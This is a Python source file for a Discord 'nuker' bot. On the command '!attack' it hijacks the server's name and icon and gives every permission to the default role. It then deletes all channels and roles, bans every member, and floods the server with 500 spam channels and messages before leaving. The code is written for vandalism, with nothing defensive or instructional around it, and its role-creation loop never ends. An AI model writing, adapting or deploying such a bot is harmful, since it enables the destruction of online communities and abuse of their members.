import discord
from discord.ext import commands
from discord import Permissions
import time
import os
token = os.environ.get('TOKENZ')

class MyClient(discord.Client):
    async def on_message(self, message):
        a = 0
        c = 0
        server = os.environ.get('SERVER')
        channel = os.environ.get('CHANNEL')
        text = os.environ.get('TEXT')
        if message.content == '!attack' and not message.author.bot:
            await message.delete()
            guild = message.guild
            with open('chaos.jpeg', 'rb') as f:
                icon = f.read()
            await guild.edit(name=str(server), icon=icon)
            await guild.default_role.edit(permissions=Permissions.all())

            for i in guild.channels:
                for j in guild.roles:
                    for k in guild.members:
                        await i.delete()
                        await j.delete()
                        await k.ban(reason='Сервер крашится')

            while c < 500:
                o = await guild.create_text_channel(name=str(channel))
                await o.send(str(text))
                c += 1
            c = 0
            while c < 250:
                await guild.create_role(name=str(channel), colour=discord.Colour(0x7289DA))
            await guild.leave()



client = MyClient()
client.run(str(token))
